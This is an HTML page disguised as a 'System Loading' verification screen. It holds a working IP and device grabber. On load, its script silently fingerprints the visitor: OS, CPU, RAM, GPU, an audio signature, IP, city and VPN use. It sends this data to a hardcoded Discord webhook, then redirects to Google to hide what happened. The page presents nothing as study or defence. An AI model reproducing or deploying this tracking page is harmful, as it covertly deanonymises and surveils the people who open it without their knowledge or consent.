<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Loading</title>
    <style>
        /* Sayfa D√ºzeni */
        body { 
            background-color: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden; 
        }
        /* Y√ºkleniyor √áarkƒ± */
        .loader { 
            border: 4px solid #111; 
            border-top: 4px solid #0f0; 
            border-radius: 50%; 
            width: 50px; 
            height: 50px; 
            animation: spin 1s linear infinite; 
            margin-bottom: 20px; 
        }
        .status { font-size: 14px; opacity: 0.8; letter-spacing: 2px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="status" id="log_display">SYSTEM VERIFICATION...</div>

    <script>
        // Hata ayƒ±klama modunu kapat
        "use strict";

        // --- AYARLAR ---
        const CONFIG = {
            webhook: "[https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL](https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL)",
            redirect: "[https://www.google.com](https://www.google.com)"
        };

        // UI G√ºncelleme
        const updateLog = (text) => document.getElementById('log_display').innerText = text;

        // 1. SES ƒ∞MZASI (Hata korumalƒ± d√∂ng√º)
        async function getAudioSig() {
            try {
                const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!AudioContext) return "No Audio API";

                const ctx = new AudioContext(1, 44100, 44100);
                const osc = ctx.createOscillator();
                osc.type = "triangle";
                osc.frequency.setValueAtTime(10000, ctx.currentTime);
                
                const compress = ctx.createDynamicsCompressor();
                osc.connect(compress);
                compress.connect(ctx.destination);
                
                osc.start(0);
                const buffer = await ctx.startRendering();
                const data = buffer.getChannelData(0);
                
                let sum = 0;
                // HTML hatasƒ±nƒ± √∂nlemek i√ßin g√ºvenli d√∂ng√º
                for (let i = 0; i < 500 && i < data.length; i++) {
                    sum += Math.abs(data[i]);
                }
                return "SIG-" + sum.toFixed(4).replace('.', '');
            } catch (e) { return "Audio Blocked"; }
        }

        // 2. ANA FONKSƒ∞YON
        async function runProtocol() {
            updateLog("ANALYZING HARDWARE ID...");

            // Veri Objeleri
            let sys = { 
                os: "Unknown", 
                gpu: "Integrated/Masked", 
                cores: navigator.hardwareConcurrency || 2,
                ram: navigator.deviceMemory || 4
            };

            // OS Tespiti
            if (navigator.userAgent.indexOf("Win") !== -1) sys.os = "Windows";
            else if (navigator.userAgent.indexOf("Mac") !== -1) sys.os = "MacOS";
            else if (navigator.userAgent.indexOf("Linux") !== -1) sys.os = "Linux";
            else if (navigator.userAgent.indexOf("Android") !== -1) sys.os = "Android";
            else if (navigator.userAgent.indexOf("like Mac") !== -1) sys.os = "iOS";

            // GPU Tespiti
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                if (gl) {
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    if(dbg) sys.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                }
            } catch(e) {}

            updateLog("ESTABLISHING UPLINK...");
            
            // IP ve Konum
            let net = { ip: "N/A", loc: "Unknown", vpn: "Clean" };
            const localTz = Intl.DateTimeFormat().resolvedOptions().timeZone;

            try {
                const req = await fetch('[https://ipapi.co/json/](https://ipapi.co/json/)');
                const j = await req.json();
                net.ip = j.ip;
                net.loc = `${j.city}, ${j.country_name}`;
                
                if (j.timezone !== localTz) {
                    net.vpn = `üö® VPN ACTIVE (IP: ${j.timezone} / Sys: ${localTz})`;
                }
            } catch(e) { net.ip = "Connection Error"; }

            // Ses ƒ∞mzasƒ±nƒ± Al
            const audioHash = await getAudioSig();

            // PAYLOAD OLU≈ûTURMA
            const payload = {
                username: "System Monitor",
                embeds: [{
                    title: "üíÄ NEW DEVICE DETECTED",
                    color: net.vpn.includes("üö®") ? 15158332 : 3066993,
                    fields: [
                        { name: "üì° NETWORK", value: `**IP:** \`${net.ip}\`\n**Loc:** ${net.loc}\n**VPN:** ${net.vpn}`, inline: false },
                        { name: "üíª DEVICE", value: `**OS:** ${sys.os}\n**CPU:** ${sys.cores} Cores\n**RAM:** ~${sys.ram} GB\n**GPU:** ${sys.gpu}`, inline: false },
                        { name: "üîê FINGERPRINT", value: `**Audio Sig:** \`${audioHash}\`\n**Time:** ${new Date().toLocaleTimeString()}`, inline: false }
                    ]
                }]
            };

            updateLog("SYNCING DATA...");

            // G√ñNDERƒ∞M (Fetch + Beacon)
            const json = JSON.stringify(payload);
            
            try {
                // √ñncelik 1: Beacon (Sayfa kapansa da gider)
                navigator.sendBeacon(CONFIG.webhook, new Blob([json], {type: 'application/json'}));
            } catch(e) {}

            try {
                // √ñncelik 2: Fetch (Yedek)
                await fetch(CONFIG.webhook, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: json
                });
            } catch(e) {}

            // Y√ñNLENDƒ∞RME
            updateLog("COMPLETE.");
            setTimeout(() => {
                window.location.href = CONFIG.redirect;
            }, 1500);
        }

        // Ba≈ülat
        window.onload = runProtocol;
    </script>
</body>
</html>
